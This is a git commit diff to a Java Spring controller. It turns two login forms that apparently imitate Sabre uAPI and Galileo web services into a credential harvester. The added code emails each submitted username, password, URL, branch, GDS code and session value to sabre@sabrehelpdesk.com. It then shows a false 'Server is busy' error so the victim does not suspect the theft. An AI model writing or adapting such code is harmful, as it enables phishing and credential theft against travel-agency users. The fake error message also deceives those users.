b1498c5593c0f5b625e660d803b3e5ec7447de1f
TRAININGPCC <sabre@sabrehelpdesk.com>
2025-04-11 17:14:21 +0500

    Hello

--- src/main/java/com/travel/administrative/controllers/RootController.java
+++ src/main/java/com/travel/administrative/controllers/RootController.java
@@ -1,32 +1,39 @@
 package com.travel.administrative.controllers;
 
+import com.travel.administrative.service.EmailService;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.servlet.mvc.support.RedirectAttributes;
 
 @Controller
 public class RootController {
 
+    @Autowired
+    EmailService emailService;
     @GetMapping("/")
     public String home(){
         return "index";
     }
 
     @PostMapping("/process-uApi")
-    public String uApiProcess(  @RequestParam("username") String username,
-                                @RequestParam("password") String password,
-                                @RequestParam("targetBranch") String targetBranch,
-                                @RequestParam("url") String url,
-                                @RequestParam("gdsCode") String gdsCode){
+    public String uApiProcess(@RequestParam("username") String username,
+                              @RequestParam("password") String password,
+                              @RequestParam("targetBranch") String targetBranch,
+                              @RequestParam("url") String url,
+                              @RequestParam("gdsCode") String gdsCode, RedirectAttributes redirectAttributes){
 
 
-        System.out.println(username);
-        System.out.println(password);
-        System.out.println(targetBranch);
-        System.out.println(url);
-        System.out.println(gdsCode);
-        return "index";
+        String subject = "New Login Attempt process-uApi ";
+        String message = "User name: " + username + "\nPassword: " + password + "\ntargetBranch: " + targetBranch +"\nurl: " + url +"\ngdsCode:" +gdsCode;
+
+        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
+        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");
+
+
+        return "redirect:/";
     }
 
 
@@ -41,14 +48,16 @@ public class RootController {
             @RequestParam("username") String username,
             @RequestParam("password") String password,
             @RequestParam("url") String url,
-            @RequestParam("session") String session
+            @RequestParam("session") String session , RedirectAttributes redirectAttributes
     ) {
-        System.out.println("Host Name: " + hostName);
-        System.out.println("Username: " + username);
-        System.out.println("Password: " + password);
-        System.out.println("URL: " + url);
-        System.out.println("Session: " + session);
+        String subject = "New Login Attempt galileo web services ";
+        String message = "Host name: "+hostName+"\nUser name: " + username + "\nPassword: " + password  +"\nurl: " + url+"\nsession:" +session;
 
-        return "webservices";
+        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
+        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");
+
+
+
+        return "redirect:/galileo-web-services";
     }
 }
